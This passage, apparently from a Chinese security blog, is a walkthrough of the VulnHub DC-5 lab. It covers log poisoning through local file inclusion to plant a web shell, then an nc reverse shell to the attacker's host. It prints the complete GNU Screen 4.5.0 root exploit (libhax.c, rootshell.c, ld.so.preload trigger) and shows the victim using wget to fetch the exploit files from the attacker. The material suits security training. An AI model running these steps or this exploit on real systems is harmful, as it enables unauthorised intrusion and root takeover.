class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and who have taken time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">root@dc-4:/root# </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5</title>
    <url>/2020/08/24/DC-5/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).</p>
<p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p>
<p>And just for the record, there is no phpmailer exploit involved. :-)</p>
<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
<p>But if youâ€™re really, really stuck, you can watch this video which shows the first step.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©ä¸Šnmap"><a href="#0x01-è€è§„çŸ©ä¸Šnmap" class="headerlink" title="0x01.è€è§„çŸ©ä¸Šnmap"></a>0x01.è€è§„çŸ©ä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ4å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 23:17 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">MAC Address: 00:0C:29:30:2B:A9 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.05 seconds</span><br><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å‘ç°å¼€æ”¾äº†80/111/40039ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># nmap -A 192.168.1.4 -p- -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 23:20 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          40039/tcp   status</span><br><span class="line">|   100024  1          44947/tcp6  status</span><br><span class="line">|   100024  1          46754/udp   status</span><br><span class="line">|_  100024  1          51314/udp6  status</span><br><span class="line">40039/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:30:2B:A9 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.58 seconds</span><br><span class="line">root@JIYE:~/tmp/DC5<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><h3 id="1-å‘ç°å‰å››ä¸ªéƒ½ä¸ºé™æ€é¡µé¢ï¼Œåªæœ‰contactæœ‰æäº¤é¢æ¿"><a href="#1-å‘ç°å‰å››ä¸ªéƒ½ä¸ºé™æ€é¡µé¢ï¼Œåªæœ‰contactæœ‰æäº¤é¢æ¿" class="headerlink" title="1.å‘ç°å‰å››ä¸ªéƒ½ä¸ºé™æ€é¡µé¢ï¼Œåªæœ‰contactæœ‰æäº¤é¢æ¿"></a>1.å‘ç°å‰å››ä¸ªéƒ½ä¸ºé™æ€é¡µé¢ï¼Œåªæœ‰contactæœ‰æäº¤é¢æ¿</h3><img src="/2020/08/24/DC-5/image-20200824113750326.png" class>

<h3 id="2-æäº¤æ•°æ®"><a href="#2-æäº¤æ•°æ®" class="headerlink" title="2.æäº¤æ•°æ®"></a>2.æäº¤æ•°æ®</h3><p><code>å‘ç°ä¸ºurlä¼ å‚</code></p>
<img src="/2020/08/24/DC-5/image-20200824114238685.png" class>

<p><code>å»æ‰å‚æ•°å†æ¬¡è®¿é—®ï¼Œå‘ç°æ¯æ¬¡åˆ·æ–°copyrightæœ‰å˜åŒ–</code></p>
<img src="/2020/08/24/DC-5/image-20200824114357269.png" class>

<h3 id="3-ä½¿ç”¨bpçˆ†ç ´æ ¹ç›®å½•phpæ–‡ä»¶"><a href="#3-ä½¿ç”¨bpçˆ†ç ´æ ¹ç›®å½•phpæ–‡ä»¶" class="headerlink" title="3.ä½¿ç”¨bpçˆ†ç ´æ ¹ç›®å½•phpæ–‡ä»¶"></a>3.ä½¿ç”¨bpçˆ†ç ´æ ¹ç›®å½•phpæ–‡ä»¶</h3><blockquote>
<p>å­—å…¸ä¸ºï¼š</p>
<p>/usr/share/dirb/wordlists/big.txt</p>
</blockquote>
<img src="/2020/08/24/DC-5/image-20200824121351077.png" class>

<p><code>çˆ†ç ´å®Œæˆï¼Œå‘ç°å¤šå‡ºä¸€ä¸ªfooter</code></p>
<img src="/2020/08/24/DC-5/image-20200824121440845.png" class>

<p><code>è®¿é—®footerï¼Œå‘ç°ä¸ºcopyrightï¼Œä¸”æ¯æ¬¡åˆ·æ–°éƒ½å˜åŒ–ï¼Œå¯ä»¥åˆ¤æ–­ä¸ºå­˜åœ¨æ–‡ä»¶åŒ…å«</code></p>
<img src="/2020/08/24/DC-5/image-20200824121734811.png" class>

<img src="/2020/08/24/DC-5/image-20200824122004107.png" class>

<h2 id="0x04-çˆ†ç ´åŒ…å«å˜é‡"><a href="#0x04-çˆ†ç ´åŒ…å«å˜é‡" class="headerlink" title="0x04.çˆ†ç ´åŒ…å«å˜é‡"></a>0x04.çˆ†ç ´åŒ…å«å˜é‡</h2><p><code>å‘ç°fileå¯èƒ½ä¸ºå˜é‡</code></p>
<blockquote>
<p>å­—å…¸ä¸º</p>
<p>/usr/share/wordlists/dirb/common.txt</p>
<p>/usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt</p>
</blockquote>
<img src="/2020/08/24/DC-5/image-20200824131915542.png" class>

<img src="/2020/08/24/DC-5/image-20200824131944199.png" class>

<img src="/2020/08/24/DC-5/image-20200824132835565.png" class>

<p><code>è¿›è¡Œæµ‹è¯•ï¼Œå¾—å‡ºfileå°±æ˜¯å˜é‡</code></p>
<img src="/2020/08/24/DC-5/image-20200824133133495.png" class>

<h2 id="0x05-å°è¯•è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#0x05-å°è¯•è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="0x05.å°è¯•è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>0x05.å°è¯•è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p><code>ç»“æœå‘ç°ä¸å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«</code></p>
<img src="/2020/08/24/DC-5/image-20200824134347907.png" class>

<img src="/2020/08/24/DC-5/image-20200824134406453.png" class>

<h2 id="0x06-æœ¬åœ°åŒ…å«"><a href="#0x06-æœ¬åœ°åŒ…å«" class="headerlink" title="0x06.æœ¬åœ°åŒ…å«"></a>0x06.æœ¬åœ°åŒ…å«</h2><p><code>ç”±äºä¸èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œæ‰€ä»¥åŒ…å«webæ—¥å¿—æ–‡ä»¶</code></p>
<p><code>ç”±äºæ˜¯nginx/1.6.2ï¼Œå¯ä»¥ä½¿ç”¨çˆ†ç ´æ—¥å¿—æ–‡ä»¶</code></p>
<p><code>è¿™é‡Œç›´æ¥ç™¾åº¦æ‰¾åˆ°äº†æ—¥å¿—æ–‡ä»¶å¸¸è§çš„ç›®å½•ï¼Œæœ¬æ¬¡å®éªŒç›®å½•ä¸º/var/log/nginx/access.log</code></p>
<img src="/2020/08/24/DC-5/image-20200824150446363.png" class>

<p><code>bpå†™å…¥å°é©¬</code></p>
<img src="/2020/08/24/DC-5/image-20200824150830757.png" class>

<p><code>ä¸Šä¼ æˆåŠŸ</code></p>
<img src="/2020/08/24/DC-5/image-20200824150900768.png" class>

<h2 id="0x07-èšå‰‘è¿æ¥shell"><a href="#0x07-èšå‰‘è¿æ¥shell" class="headerlink" title="0x07.èšå‰‘è¿æ¥shell"></a>0x07.èšå‰‘è¿æ¥shell</h2><img src="/2020/08/24/DC-5/image-20200824151103230.png" class>

<h2 id="0x08-èšå‰‘å»ºç«‹ç¨³å®šçš„shell"><a href="#0x08-èšå‰‘å»ºç«‹ç¨³å®šçš„shell" class="headerlink" title="0x08.èšå‰‘å»ºç«‹ç¨³å®šçš„shell"></a>0x08.èšå‰‘å»ºç«‹ç¨³å®šçš„shell</h2><p><code>ç”±äºæ—¥å¿—æ–‡ä»¶å­˜åœ¨è¯»å†™ï¼Œæ‰€ä»¥åœ¨/tmpä¸‹åˆ›å»ºç¨³å®šå°é©¬è¿›è¡Œè¿æ¥</code></p>
<p><code>æ­¤å¤„404ç”¨äºæ¬ºéª—</code></p>
<img src="/2020/08/24/DC-5/image-20200824151445724.png" class>

<p><code>è®¿é—®</code></p>
<img src="/2020/08/24/DC-5/image-20200824151541645.png" class>

<p><code>è¿æ¥</code></p>
<img src="/2020/08/24/DC-5/image-20200824151632387.png" class>

<h2 id="0x08-åå¼¹shellç»™kali"><a href="#0x08-åå¼¹shellç»™kali" class="headerlink" title="0x08.åå¼¹shellç»™kali"></a>0x08.åå¼¹shellç»™kali</h2><p><code>ç”±äºè¿™é‡Œæœ‰ncï¼Œæ‰€ä»¥å¯ä»¥åå¼¹shell</code></p>
<img src="/2020/08/24/DC-5/image-20200824151959062.png" class>

<p><code>å»ºç«‹è¿æ¥</code></p>
<img src="/2020/08/24/DC-5/image-20200824152332844.png" class>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.4] 38471</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p><code>å»ºç«‹äº¤äº’å¼shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>              </span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@dc-5:~/html$ <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure>

<h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><h3 id="1-å°è¯•sudo-l"><a href="#1-å°è¯•sudo-l" class="headerlink" title="1.å°è¯•sudo -l"></a>1.å°è¯•sudo -l</h3><p><code>å‘ç°æ²¡æœ‰</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">bash: sudo: <span class="built_in">command</span> not found</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure>

<h3 id="2-æŸ¥çœ‹SUID"><a href="#2-æŸ¥çœ‹SUID" class="headerlink" title="2.æŸ¥çœ‹SUID"></a>2.æŸ¥çœ‹SUID</h3><p><code>å‘ç°screen-4.5.0å…·æœ‰SUIDæƒé™</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/$ find / -perm /4000 2&gt;dev/null</span><br><span class="line">find / -perm /4000 2&gt;dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure>

<h3 id="3-æŸ¥çœ‹screen-4-5-0æ˜¯å¦æœ‰æ¼æ´"><a href="#3-æŸ¥çœ‹screen-4-5-0æ˜¯å¦æœ‰æ¼æ´" class="headerlink" title="3.æŸ¥çœ‹screen-4.5.0æ˜¯å¦æœ‰æ¼æ´"></a>3.æŸ¥çœ‹screen-4.5.0æ˜¯å¦æœ‰æ¼æ´</h3><p><code>å‘ç°å­˜åœ¨æœ¬åœ°ç‰¹æƒæå‡æ¼æ´</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                    |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                                                     | linux/<span class="built_in">local</span>/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                               | linux/<span class="built_in">local</span>/41152.txt</span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@JIYE:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ æ–‡ä»¶</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># ls</span></span><br><span class="line">41154.sh</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cp 41154.sh /var/www/html/</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># systemctl start apache2</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp<span class="variable">$wget</span> http://192.168.1.6/41154.sh</span><br><span class="line">converted <span class="string">&#x27;http://192.168.1.6/41154.sh&#x27;</span> (ANSI_X3.4-1968) -&gt; <span class="string">&#x27;http://192.168.1.6/41154.sh&#x27;</span> (UTF-8)</span><br><span class="line">--2020-08-25 00:57:32--  http://192.168.1.6/41154.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1192 (1.2K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;41154.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">41154.sh            100%[=====================&gt;]   1.16K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-08-25 00:57:32 (350 MB/s) - <span class="string">&#x27;41154.sh&#x27;</span> saved [1192/1192]</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">41154.sh  demo.php</span><br><span class="line">www-data@dc-5:/tmp$</span><br></pre></td></tr></table></figure>

<h3 id="4-æ·»åŠ æ‰§è¡Œæƒé™æ‰§è¡Œ"><a href="#4-æ·»åŠ æ‰§è¡Œæƒé™æ‰§è¡Œ" class="headerlink" title="4.æ·»åŠ æ‰§è¡Œæƒé™æ‰§è¡Œ"></a>4.æ·»åŠ æ‰§è¡Œæƒé™æ‰§è¡Œ</h3><p><code>æŠ¥é”™äº†ã€‚ã€‚ã€‚</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ chmod +x 41154.sh</span><br><span class="line">chmod +x 41154.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory</span><br><span class="line">www-data@dc-5:/tmp$ </span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹æ–‡ä»¶ï¼Œè„šæœ¬æ˜¯ä¸€ä¸ªç¼–è¯‘c</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat 41154.sh </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshellroot@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸‹é¢è¿›è¡Œæœ¬åœ°ç¼–è¯‘</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat libhax.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat rootshell.c </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># </span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat run.sh </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span></span><br><span class="line">./libhax.c: In <span class="keyword">function</span> â€˜dropshellâ€™:</span><br><span class="line">./libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> â€˜chmodâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># gcc -o ./rootshell ./rootshell.c</span></span><br><span class="line">./rootshell.c: In <span class="keyword">function</span> â€˜mainâ€™:</span><br><span class="line">./rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> â€˜setuidâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     setuid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> â€˜setgidâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">    4 |     setgid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> â€˜seteuidâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">    5 |     seteuid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">./rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> â€˜setegidâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |     setegid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">./rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> â€˜execvpâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:7:5: warning: too many arguments to built-in <span class="keyword">function</span> â€˜execvpâ€™ expecting 2 [-Wbuiltin-declaration-mismatch]</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># ls</span></span><br><span class="line">41154.sh  libhax.c  libhax.so  rootshell  rootshell.c</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="5-æ‰§è¡Œ"><a href="#5-æ‰§è¡Œ" class="headerlink" title="5.æ‰§è¡Œ"></a>5.æ‰§è¡Œ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/run.sh</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/rootshell</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ chmod +x run.sh</span><br><span class="line">chmod +x run.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./run.sh</span><br><span class="line">./run.sh</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br><span class="line"><span class="string"># 